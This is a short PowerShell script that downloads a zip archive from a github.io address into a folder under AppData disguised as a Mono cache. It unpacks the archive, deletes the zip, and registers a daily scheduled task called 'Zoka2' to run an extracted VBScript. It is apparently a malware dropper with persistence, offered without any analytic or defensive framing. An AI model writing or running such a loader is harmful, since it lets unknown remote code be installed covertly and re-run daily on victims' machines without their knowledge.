$web = New-Object System.Net.WebClient
function Install {
    
    $src = 'https://theTonyVal.github.io/zip/sound.zip'
    $path = 'C:\Users\' + $env:username + '\AppData\Roaming\.mono\cache\sound'

    $test = Test-Path $path

    if ($test) {
        Remove-Item $path -Recurse
        New-Item -Path $path -ItemType Directory
    }
    else {
        New-Item -Path $path -ItemType Directory
    }


    $dest = 'C:\Users\'+ $env:username + '\AppData\Roaming\.mono\cache\sound\sound.zip'
    Write-Host $dest
    $web.DownloadFile($src, $dest)

    Expand-Archive -LiteralPath $dest -DestinationPath $path
    Remove-Item $dest

}

function Task {

    $TaskName = 'Zoka2'

    $ScriptPath = 'C:\Users\' + $env:username + '\AppData\Roaming\.mono\cache\sound\sound.vbs'
    $Trigger= New-ScheduledTaskTrigger -At 11:30 -Daily
    $Action= New-ScheduledTaskAction -Execute $ScriptPath

    $test = Test-Path -Path 'C:\Windows\System32\Tasks\Zoka2'

    if ($test) {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
        Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -User $env:username -Action $Action
    }
    else {
        Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -User $env:username -Action $Action
    }

}

Install
Task